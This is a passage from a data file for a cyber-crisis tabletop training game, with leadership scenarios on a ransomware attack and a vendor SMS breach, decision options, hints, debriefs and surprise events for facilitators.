        "answer": "0840",
        "task": "Indian rules say incidents like this must be reported to CERT-In (India’s national cyber-security agency) within 6 hours of being noticed. Find in the timeline when it was noticed, and enter the latest time the report can go in.",
        "cols": [
          "Time",
          "What happened"
        ],
        "rows": [
          [
            "01:52",
            "Nightly backup finishes as normal",
            "ok"
          ],
          [
            "02:31",
            "Files on the settlement servers start getting locked and renamed to .vtx (nobody has noticed yet)",
            "bad"
          ],
          [
            "02:40",
            "The security monitoring team (SOC) spots the locked files and declares an incident",
            "bad"
          ],
          [
            "02:48",
            "The CISO calls you",
            "info"
          ],
          [
            "03:05",
            "Crisis team meets on a call",
            "info"
          ],
          [
            "03:40",
            "Ransom note found on 32 servers",
            "bad"
          ]
        ],
        "hint": "The clock starts when the incident is first noticed. Not when the attack began, and not when you were told.",
        "debrief": "08:40 is the deadline. Legal files the CERT-In report at 07:15 with what’s known so far, and sends updates later. RBI and your bank clients have their own timelines too.<br><b>Remember:</b> The reporting clock starts when the incident is noticed. Report what you know on time, then update.",
        "topic": "reporting",
        "good": "You knew the reporting clock starts when the incident is noticed, not when the investigation ends.",
        "gap": "Reporting deadlines start when the incident is noticed. Report what you know on time, then update.",
        "act": "Keep a one-page list of reporting deadlines (CERT-In, RBI, client contracts) in the crisis kit."
      },
      {
        "type": "pick",
        "name": "The crisis team",
        "task": "Pick the 4 people who must join the crisis team’s first call, alongside you and the CISO.",
        "items": [
          {
            "id": "legal",
            "text": "Head of Legal and Compliance",
            "bad": true,
            "why": "Reporting deadlines, contracts and the ransom question all need Legal."
          },
          {
            "id": "all",
            "text": "Every employee, so nobody hears it second-hand",
            "why": "A crisis call needs decision-makers. Staff get updates through the communications plan."
          },
          {
            "id": "ops",
            "text": "Head of Operations, who owns Monday’s settlement",
            "bad": true,
            "why": "Operations knows the business impact and the workarounds."
          },
          {
            "id": "client",
            "text": "Your largest bank client’s CEO",
            "why": "Clients are told through the agreed process, not invited onto your crisis call."
          },
          {
            "id": "comms",
            "text": "Head of Corporate Communications",
            "bad": true,
            "why": "Clients, media and staff will need clear messages that all say the same thing."
          },
          {
            "id": "cto",
            "text": "CTO or Head of IT Infrastructure",
            "bad": true,
            "why": "Recovery, backups and how long the restore takes need their decisions."
          },
          {
            "id": "pr",
            "text": "An outside PR agency, before Legal has reviewed anything",
            "why": "Outside advisers come in through Legal, so advice stays consistent and legally protected."
          }
        ],
        "hint": "Who covers the law, the business, the public message and the systems?",
        "debrief": "The core team is set: Legal, Operations, Communications and Technology, with the CISO leading. Sunday morning brings the hardest decision of the weekend.<br><b>Remember:</b> A crisis team is the few people who can decide, not a crowd.",
        "topic": "leadership",
        "good": "You built a crisis team that covers law, business, message and systems.",
        "gap": "A crisis team needs decision-makers for legal, operations, communications and technology, not a crowd.",
        "act": "Name a main person and a backup for each crisis-team role, and test the call list twice a year."
      },
      {
        "type": "order",
        "name": "The first 48 hours",
        "task": "Put the leadership priorities for the first 48 hours in the right order.",
        "steps": [
          {
            "id": "contain",
            "text": "Contain: cut the affected systems off from the network and protect the backups."
          },
          {
            "id": "notify",
            "text": "Notify: tell CERT-In, RBI and bank clients within their deadlines."
          },
          {
            "id": "recover",
            "text": "Recover: rebuild systems from clean backups once the attacker is removed."
          },
          {
            "id": "review",
            "text": "Review: find the root cause, learn the lessons and report to the board."
          }
        ],
        "shown": [
          "notify",
          "review",
          "contain",
          "recover"
        ],
        "hint": "Stop the spread first. You can’t recover while the attacker is still inside, and reviews come after recovery.",
        "debrief": "Contain, notify, recover, review. That order keeps the damage small and keeps regulators informed. Next: the media.<br><b>Remember:</b> Stop the spread first, report on time, restore cleanly, then learn.",
        "topic": "response",
        "good": "You set the right priorities for the first 48 hours.",
        "gap": "Contain first, notify within deadlines, recover cleanly, then review.",
        "act": "Rehearse the first 48 hours of a ransomware attack with the leadership team once a year."
      },
      {
        "type": "spot",
        "frame": "note",
        "name": "The press statement",
        "task": "Communications has drafted a statement for the media. Tap the 4 lines that must not go out.",
        "items": [
          {
            "id": "hd",
            "html": "<b>DRAFT · Vertex Pay statement</b>"
          },
          {
            "id": "open",
            "html": "Vertex Pay is responding to a cyber incident affecting some settlement services."
          },
          {
            "id": "nodata",
            "html": "No customer data has been affected.",
            "flag": true,
            "note": "You don’t know that yet. Never claim what isn’t confirmed."
          },
          {
            "id": "blame",
            "html": "The incident was caused by an employee clicking a malicious link.",
            "flag": true,
            "note": "Blaming staff in public damages trust, and it isn’t confirmed either."
          },
          {
            "id": "auth",
            "html": "We have informed the relevant authorities and are working with them."
          },
          {
            "id": "nation",
            "html": "This was a highly sophisticated attack by a foreign government that no company could have stopped.",
            "flag": true,
            "note": "That’s guessing and making excuses. Stick to facts."
          },
          {
            "id": "silent",
            "html": "We will not be making any further comment.",
            "flag": true,
            "note": "Promise updates instead. Silence fills with rumours."
          },
          {
            "id": "help",
            "html": "Customers with questions can call our helpline."
          }
        ],
        "hint": "Look for claims you can’t prove yet, blaming someone, guessing, and refusing to say more.",
        "debrief": "The final statement sticks to facts, owns the problem and promises updates. One last meeting: the board.<br><b>Remember:</b> In public, say only what you know, blame no one, and promise updates.",
        "topic": "comms",
        "good": "You kept the statement to facts, ownership and a promise of updates.",
        "gap": "Crisis statements avoid unconfirmed claims, blame and guessing, and promise updates.",
        "act": "Prepare pre-approved holding statements for cyber incidents before you need them."
      },
      {
        "type": "choice",
        "name": "The board",
        "task": "Monday evening. The board asks what you need so this doesn’t happen again. What’s your best answer?",
        "options": [
          {
            "id": "tools",
            "text": "A one-off budget for new security tools, then back to business as usual.",
            "why": "Tools alone don’t fix process, people or follow-through."
          },
          {
            "id": "fund",
            "text": "Fund the review’s fixes, back the CISO with authority, and track each fix at board level.",
            "right": true,
            "why": "Money, authority and board follow-up are what only leaders can provide."
          },
          {
            "id": "fire",
            "text": "Find the employee who clicked the link and dismiss them as an example.",
            "why": "Blame makes people hide mistakes: they stop reporting incidents."
          },
          {
            "id": "secret",
            "text": "Commission an outside report and keep the findings from the security team.",
            "why": "The people fixing the problem need the findings."
          }
        ],
        "hint": "Look for what only leaders can give, and what keeps fixes on track.",
        "debrief": "Case closed. The fixes are funded, owned and tracked by the board. That’s leadership in a cyber crisis.<br><b>Remember:</b> Fund the fixes, back the CISO and track every action until it’s closed.",
        "topic": "governance",
        "good": "You gave security funding, authority and board-level follow-through.",
        "gap": "After an incident, leaders fund the fixes, empower the CISO and track actions to closure, without blame.",
        "act": "Put open security actions from incidents on the board’s risk agenda until they close."
      }
    ],
    "decision": {
      "type": "decision",
      "name": "The ransom",
      "prompt": "Sunday, 9 AM. Clean offline backups (copies kept unplugged from the network) exist, but a full restore takes about 30 hours and will miss Monday’s settlement. The attackers offer a key to unlock the files for ₹4 crore and threaten to publish customer data. A board member says: “Just pay and make it go away.” What do you decide?",
      "options": [
        {
          "id": "restore",
          "text": "Don’t pay. Restore from clean backups, agree a fallback settlement plan with bank clients, and bring in police and regulators.",
          "q": "best",
          "note": "Strong call. Paying doesn’t guarantee a working key or deleted data, and it funds the next attack."
        },
        {
          "id": "negotiate",
          "text": "Hire specialist negotiators to buy time while you restore, but decide nothing without Legal and the board.",
          "q": "ok",
          "note": "Buying time can help, but it delays a clear decision. +60 seconds."
        },
        {
          "id": "pay",
          "text": "Pay quietly to meet Monday’s deadline, and tell no one outside the crisis team.",
          "q": "poor",
          "note": "Paying doesn’t make it go away, and “quietly” is never an option. +120 seconds, and a detour."
        }
      ],
      "topic": "leadership",
      "good": "You refused to pay and chose a clean, open recovery.",
      "gap": "Paying is never quiet or guaranteed. Decide with Legal, the board and police, and restore from clean backups.",
      "act": "Agree the company’s stance on paying ransoms with the board before an incident, not during one."
    },
    "detour": {
      "type": "pick",
      "name": "After the payment",
      "task": "You paid. The key unlocks only 60% of the files, and the attackers publish the data anyway. Pick the 2 consequences you now face.",
      "items": [
        {
          "id": "target",
          "text": "You’re marked as a company that pays, so you’re more likely to be attacked again",
          "bad": true,
          "why": "Criminal groups share lists of companies that pay."
        },
        {
          "id": "reg",
          "text": "Regulators no longer need to be told, since it’s resolved",
          "why": "Paying doesn’t remove your duty to report."
        },
        {
          "id": "duties",
          "text": "Every duty to inform others still applies, now with leaked data to explain",
          "bad": true,
          "why": "Paying changes nothing about telling regulators, clients and customers."
        },
        {
          "id": "ins",
          "text": "Cyber insurance automatically pays back the ransom",
          "why": "Policies vary, often limit ransom cover, and need to be told quickly."
        }
      ],
      "hint": "What has paying actually changed, and what has stayed the same?",
      "debrief": "Paying bought a key that only partly works, and a bigger problem. Now get the business back the right way.<br><b>Remember:</b> Paying a ransom doesn’t end the crisis or your duty to report.",
      "topic": "leadership",
      "good": "You saw the real cost of paying.",
      "gap": "Paying marks you as a target, and every duty to inform still applies.",
      "act": "Brief the board on why paying rarely ends a ransomware crisis."
    },
    "lessons": [
      "In a crisis, set structure first: the plan, one person in charge, the right crisis team.",
      "Reporting deadlines start when the incident is noticed. Report on time, then update.",
      "Don’t pay quietly. Decide with Legal, the board and police, and restore from clean backups.",
      "Public statements: facts only, no blame, no guessing, and a promise of updates.",
      "Back the security team with funding, authority and board-level follow-through."
    ]
  },
  {
    "id": "lead-vendor",
    "track": "lead",
    "title": "The Vendor Breach",
    "company": "Halcyon Pay",
    "threat": "Leadership: vendor (third-party) breach, OTP fraud, vendor governance",
    "lede": "Tuesday, 10:15 AM. A news site reports that Pingly, the SMS company that sends Halcyon Pay’s OTPs (one-time passwords), has been hacked. Customers are already getting scam calls that mention their real transactions.",
    "locks": [
      {
        "type": "choice",
        "name": "The headline",
        "task": "The story is trending and your COO forwards it to you. What do you do first?",
        "options": [
          {
            "id": "wait",
            "text": "Wait for Pingly’s official notice before taking any action.",
            "why": "Vendors are often slow to confirm. Your own response has to start now."
          },
          {
            "id": "start",
            "text": "Start your incident process and get Pingly to confirm what is affected.",
            "right": true,
            "why": "A critical vendor’s breach is your incident. Get the facts fast."
          },
          {
            "id": "cut",
            "text": "Switch Pingly off right away, before you know the impact.",
            "why": "Cutting a critical service with no plan can lock every customer out. Decide with facts and a backup ready."
          },
          {
            "id": "post",
            "text": "Reassure the market with a LinkedIn post that Halcyon Pay is safe.",
            "why": "You don’t know that yet, and a wrong statement costs trust."
          }
        ],
        "hint": "Whose problem is this, and what do you need before you act or speak?",
        "debrief": "Within the hour, Pingly confirms attackers could read its message logs, including OTPs and customer phone numbers, for nine days. Your team pulls up the Pingly contract.<br><b>Remember:</b> A critical vendor’s breach is your incident. Start your response at once.",
        "topic": "vendor",
        "good": "You treated the vendor’s breach as your own incident from the first minute.",
        "gap": "A critical vendor’s breach is your incident. Start your process and get the facts before you act or speak.",
        "act": "Keep a list of critical vendors and each one’s emergency contact in the crisis kit."
      },
      {
        "type": "spot",
        "frame": "note",
        "name": "The contract",
        "task": "These are the security terms in the Pingly contract. Tap the 4 terms that are hurting you right now.",
        "items": [
          {
            "id": "hd",
            "html": "<b>Pingly services agreement · Schedule 4: Security</b>"
          },
          {
            "id": "sla",
            "html": "Service availability: 99.9% per month."
          },
          {
            "id": "notice",
            "html": "Pingly will tell you about a breach within 30 days of confirming it.",
            "flag": true,
            "note": "Far too slow: your own reporting deadlines to regulators run in hours."
          },
          {
            "id": "audit",
            "html": "Halcyon Pay has no right to audit (inspect) Pingly’s security.",
            "flag": true,
            "note": "Without audit rights, you can’t check what they actually do."
          },
          {
            "id": "retain",
            "html": "Pingly keeps message records for as long as its own policy says.",
            "flag": true,
            "note": "Nine days of OTPs sat in these records. Data no one needs shouldn’t be kept."
          },
          {
            "id": "sub",
            "html": "Pingly may hand work to other firms (subcontractors) without telling you.",
            "flag": true,
            "note": "Your customers’ data may sit with a firm you’ve never checked."
          },
          {
            "id": "fees",
            "html": "Fees are invoiced monthly."
          },
          {
            "id": "law",
            "html": "Governing law: India."
          }
        ],
        "hint": "Ask of each term: does it slow us down, hide things from us, or keep or share our data?",
        "debrief": "Every one of these gaps was signed off as “standard terms”. Now you need answers from Pingly, fast.<br><b>Remember:</b> Critical vendor contracts need fast breach notice, audit rights, data limits and control of subcontractors.",
        "topic": "vendor",
        "good": "You spotted the contract gaps that turn a vendor’s problem into yours.",
        "gap": "Vendor contracts need fast breach notice, audit rights, limits on data kept, and control over subcontractors.",
        "act": "Add minimum security terms to every critical vendor contract at renewal."
      },
      {
        "type": "pick",
        "name": "The first questions",
        "task": "Pick the 3 questions you most need answered in the first hour.",
        "items": [
          {
            "id": "data",
            "text": "Which of our customers’ data did Pingly hold?",
            "bad": true,
            "why": "This decides who must be told and protected."
          },
          {
            "id": "cost",
            "text": "How much will this breach cost Pingly?",
            "why": "Their costs aren’t your decision right now."
          },
          {
            "id": "reach",
            "text": "Can the attackers still use Pingly’s keys (API keys) into our systems?",
            "bad": true,
            "why": "If they can, the breach can spread into your own platform."
          },
          {
            "id": "blame",
            "text": "Who at Pingly is to blame?",
            "why": "Blame can wait. Stopping the damage can’t."
          },
          {
            "id": "live",
            "text": "Are our OTPs still passing through Pingly’s hacked systems?",
            "bad": true,
            "why": "If so, customers are still exposed right now."
          },
          {
            "id": "disc",
            "text": "Can we claim a penalty or discount from Pingly?",
            "why": "Worth raising later, not in the first hour."
          }
        ],
        "hint": "Think: who is at risk, what links Pingly to you, and is it still happening?",
        "debrief": "The answers: 2.1 lakh customers’ phone numbers were exposed, OTPs are still flowing through Pingly, and Pingly’s API keys into your platform haven’t been changed.<br><b>Remember:</b> First ask what data was exposed, what connects to you, and whether it is still happening.",
        "topic": "vendor",
        "good": "You asked the questions that decide who’s at risk right now.",
        "gap": "In the first hour, ask what data was exposed, what connects to you, and whether the exposure is still live.",
        "act": "Keep a first-hour question list for vendor incidents in the crisis kit."
      },
      {
        "type": "code",
        "name": "The keys",
        "mask": "####",
        "answer": "4471",
        "task": "API keys are digital passes that let Pingly connect to your platform. Find the key the attackers used and enter its Key ID.",
        "cols": [
          "Key ID",
          "Used from",
          "Last used",
          "Status"
        ],
        "rows": [
          [
            "2210",
            "Pingly’s data centre in Mumbai",
            "Today 09:58",
            "Active",
            "ok"
          ],
          [
            "3093",
            "Not used by anyone",
            "Never (created 91 days ago)",
            "Active",
            "info"
          ],
          [
            "4471",
            "Pingly’s data centre in Mumbai, and an unknown address overseas",
            "Today 03:12",
            "Active",
            "bad"
          ],
          [
            "5568",
            "Pingly’s data centre in Mumbai",
            "Today 10:01",
            "Active",
            "ok"
          ]
        ],
        "hint": "Pingly works only from Mumbai. Which key was also used from somewhere else?",
        "debrief": "Key 4471 was used from an unknown overseas address at 3:12 AM. Every key shared with Pingly is now changed. Unused key 3093 should never have existed: it was an open door no one was watching.<br><b>Remember:</b> Give vendors only the access they need, watch it, and remove keys nobody uses.",
        "topic": "vendor",
        "good": "You found the misused key and questioned the unused one.",
        "gap": "Vendor access should be the minimum needed, and watched. Unused keys shouldn’t exist.",
        "act": "Review every key and access a vendor holds, and remove what isn’t needed."
      },
      {
        "type": "order",
        "name": "The response plan",
        "task": "Put the steps of the vendor-incident response in the right order.",
        "steps": [
          {
            "id": "owner",
            "text": "Name one owner and run it as one incident across Security, Vendor Risk, Legal and Communications."
          },
          {
            "id": "contain",
            "text": "Contain it: change the shared keys and cut Pingly’s access to anything it doesn’t need."
          },
          {
            "id": "notify",
            "text": "Inform bank clients and regulators within their deadlines, and warn customers about the scam calls."
          },
          {
            "id": "review",
            "text": "After it’s closed: review Pingly’s contract, risk rating and your exit plan."
          }
        ],
        "shown": [
          "review",
          "notify",
          "owner",
          "contain"
        ],
        "hint": "Someone must be in charge before anything else, and reviews wait until the incident is over.",
        "debrief": "One owner, then contain, notify and review. Last stop: the board wants to know how to stop the next one.<br><b>Remember:</b> Put one person in charge, stop the damage, report on time, then review the vendor.",
        "topic": "response",
        "good": "You ran the vendor incident in the right order.",
        "gap": "Name an owner, contain, notify within deadlines, then review the vendor.",
        "act": "Make sure vendor incidents follow your main incident plan, with one named owner."
      },
      {
        "type": "choice",
        "name": "The board’s question",
        "task": "The board asks how to stop the next vendor breach becoming your crisis. What is your strongest answer?",
        "options": [
          {
            "id": "house",
            "text": "Bring every outsourced service in-house so we control it all.",
            "why": "Rarely realistic, and in-house systems get breached too."
          },
          {
            "id": "program",
            "text": "Rank vendors by risk, set strong contract terms, monitor them and test exit plans.",
            "right": true,
            "why": "Third-party risk is managed as an ongoing programme, not avoided."
          },
          {
            "id": "paper",
            "text": "Ask every vendor to sign a yearly declaration that their security is sound.",
            "why": "Paperwork without checks gives false comfort."
          },
          {
            "id": "cheap",
            "text": "Always choose the cheapest vendor that holds an ISO certificate.",
            "why": "A certificate is a starting point, not proof of good security."
          }
        ],
        "hint": "Which answer is an ongoing programme, not a one-off fix?",
        "debrief": "Case closed. Halcyon Pay now runs third-party (vendor) risk as a programme the board reviews every quarter.<br><b>Remember:</b> You can outsource a service, but not its risk. Manage vendors as an ongoing programme.",
        "topic": "governance",
        "good": "You turned a vendor crisis into a lasting third-party risk programme.",
        "gap": "Manage vendors as a programme: rank them by risk, set contract terms, monitor them and test exit plans.",
        "act": "Ask for a quarterly third-party risk report at board or risk committee level."
      }
    ],
    "decision": {
      "type": "decision",
      "name": "The switch",
      "prompt": "Pingly can’t confirm the attackers are out for another 48 hours. Your backup SMS provider is ready, but switching costs ₹30 lakh and needs 2 hours of planned downtime. The business head wants to wait. What do you decide?",
      "options": [
        {
          "id": "switch",
          "text": "Switch to the backup provider tonight, change every shared key, and tell bank clients.",
          "q": "best",
          "note": "Strong call. Protecting customers comes before the switching cost."
        },
        {
          "id": "monitor",
          "text": "Stay with Pingly for now, but change the shared keys and add fraud monitoring.",
          "q": "ok",
          "note": "Better than nothing, but OTPs still pass through a hacked system. +60 seconds."
        },
        {
          "id": "stay",
          "text": "Stay as you are and wait. It’s Pingly’s breach, not ours.",
          "q": "poor",
          "note": "Your customers, your regulators, your problem. +120 seconds, and a detour."
        }
      ],
      "topic": "vendor",
      "good": "You protected customers first, even at a cost.",
      "gap": "When a critical vendor is hacked, move to a safe backup and change shared keys, even when it costs money.",
      "act": "Test your backup provider and switch-over plan for every critical vendor."
    },
    "detour": {
      "type": "pick",
      "name": "The fraud wave",
      "task": "Two days later, scam calls quoting real OTPs are emptying customer accounts. Pick the 2 actions to take now.",
      "items": [
        {
          "id": "warn",
          "text": "Warn bank clients and customers about the scam calls, and remind them never to share an OTP",
          "bad": true,
          "why": "Fast, clear warnings stop more people being fooled."
        },
        {
          "id": "helpline",
          "text": "Tell customers to share OTPs only with your official helpline",
          "why": "No genuine helpline ever asks for an OTP. This helps the scammers."
        },
        {
          "id": "move",
          "text": "Change the keys shared with Pingly and move OTP messages to the backup provider",
          "bad": true,
          "why": "This cuts off the attackers’ supply of fresh OTPs."
        },
        {
          "id": "alerts",
          "text": "Turn off fraud alerts for now to cut down the false alarms",
          "why": "Exactly the wrong moment to lower your guard."
        }
      ],
      "hint": "You need to stop the scam calls working, and also stop the leak behind them.",
      "debrief": "The switch happens two days late, after real customer losses. Now find the key the attackers used.<br><b>Remember:</b> When a vendor leak is fuelling fraud, warn customers and cut off the source fast.",
      "topic": "vendor",
      "good": "You stopped both the scam and its source.",
      "gap": "Waiting turned a vendor breach into customer losses. Warn customers and cut off the source fast.",
      "act": "Keep customer-warning messages ready for fraud waves."
    },
    "lessons": [
      "A critical vendor’s breach is your incident. Start your response at once.",
      "Contracts need fast breach notice, audit rights, limits on data kept and control of subcontractors.",
      "Protect customers first: switch to a backup and change shared keys, even when it costs money.",
      "Unused keys and access shouldn’t exist. Review what each vendor can reach.",
      "Run third-party risk as a programme: rank vendors, set contract terms, monitor them and test exit plans."
    ]
  }
];

/** Surprise events the facilitator can send to any team mid-game. */
export const INJECTS: Inject[] = [
  {
    "id": "media",
    "name": "A journalist calls",
    "prompt": "A journalist calls asking you to confirm the incident.",
    "options": [
      {
        "id": "a",
        "text": "Say you can’t comment, and pass the call to Corporate Communications.",
        "q": "best",
        "note": "Only authorised spokespeople talk to the media."
      },
      {
        "id": "b",
        "text": "Hang up without saying anything.",
        "q": "ok",
        "note": "No leak, but Comms should know a journalist is asking. +30 seconds."
      },
      {
        "id": "c",
        "text": "Confirm what you know, off the record.",
        "q": "poor",
        "note": "There is no off the record. That becomes the headline. +90 seconds."
      }
    ],
    "topic": "comms",
    "act": "Pass every media call to Corporate Communications."
  },
  {
    "id": "hush",
    "name": "Keep it quiet",
    "prompt": "A senior manager asks you to keep the incident quiet until month-end.",
    "options": [
      {
        "id": "a",
        "text": "Explain it must be reported now, as policy and the law require, and tell the CISO (head of security).",
        "q": "best",
        "note": "Reporting deadlines, like CERT-In’s 6 hours (India’s cyber security agency), don’t wait for month-end."
      },
      {
        "id": "b",
        "text": "Agree, but write it down in case you need it later.",
        "q": "ok",
        "note": "Writing it down doesn’t make delaying it acceptable. +30 seconds."
      },
      {
        "id": "c",
        "text": "Agree. Month-end numbers matter more.",
        "q": "poor",
        "note": "Hiding an incident turns a breach into a compliance failure. +90 seconds."
      }
    ],
    "topic": "reporting",
    "act": "If anyone asks you to delay reporting an incident, tell the CISO."
  },
  {
    "id": "extort",
    "name": "The attacker writes",
    "prompt": "The attacker emails you: “Pay 5 Bitcoin or we publish the data.”",
    "options": [
      {
        "id": "a",
        "text": "Don’t reply. Forward it to Security as evidence.",
        "q": "best",
        "note": "Evidence kept, and the attacker gets nothing."
      },
      {
        "id": "b",
        "text": "Delete the email.",
        "q": "ok",
        "note": "You’ve lost evidence Security needed. +30 seconds."
      },
      {
        "id": "c",
        "text": "Reply asking for proof that they have the data.",
        "q": "poor",
        "note": "Engaging tells them you’re worried and willing to talk. +90 seconds."
      }
    ],
    "topic": "response",
    "act": "Never reply to attackers. Forward their messages to Security as evidence."
  },
  {
    "id": "whatsapp",
    "name": "The WhatsApp post",
    "prompt": "A colleague posts screenshots of the incident in a staff WhatsApp group.",
    "options": [
      {
        "id": "a",
        "text": "Ask them to delete it, and report it to Security.",
        "q": "best",
        "note": "It stops the spread and Security knows."
      },
      {
        "id": "b",
        "text": "Ignore it. Not your business.",
        "q": "ok",
        "note": "The screenshots keep spreading. +30 seconds."
      },
      {
        "id": "c",
        "text": "Forward it to friends to warn them.",
        "q": "poor",
        "note": "You’ve just leaked confidential incident details. +90 seconds."
      }
    ],
    "topic": "data",
    "act": "Keep incident details out of chat groups, and report leaks of them."
  },
  {
    "id": "fakeit",
    "name": "The helpful caller",
    "prompt": "Someone claiming to be from IT calls, offering to “fix it” if you install a remote-access app (an app that lets them control your computer).",
    "options": [
      {
        "id": "a",
        "text": "Hang up and call the IT helpdesk on the number you know.",
        "q": "best",
        "note": "Attackers love a crisis. Verify on a channel you start."
      },
      {
        "id": "b",
        "text": "Ask for their employee ID first.",
        "q": "ok",
        "note": "IDs are easy to invent. Call back on a known number. +30 seconds."
      },
      {
        "id": "c",
        "text": "Install the app so they can help.",
        "q": "poor",
        "note": "You’ve just given an attacker remote control. +90 seconds."
      }
    ],
    "topic": "social",
    "act": "Never install remote-access apps for unexpected callers. Call IT back yourself."
  },
  {
    "id": "client",
    "name": "The bank client asks",
    "prompt": "One of your bank clients asks for an update on the incident.",
    "options": [
      {
        "id": "a",
        "text": "Pass it to the incident lead, who shares only confirmed facts through the agreed channel.",
        "q": "best",
        "note": "One voice, confirmed facts, the agreed route."
      },
      {
        "id": "b",
        "text": "Say you’ll get back to them.",
        "q": "ok",
        "note": "Fine, but tell the incident lead straight away. +30 seconds."
      },
      {
        "id": "c",
        "text": "Email them the raw logs yourself.",
        "q": "poor",
        "note": "Raw logs (system records) can hold other clients’ data and unconfirmed guesses. +90 seconds."
      }
    ],
    "topic": "comms",
    "act": "Route client questions about incidents to the incident lead."
  }
];
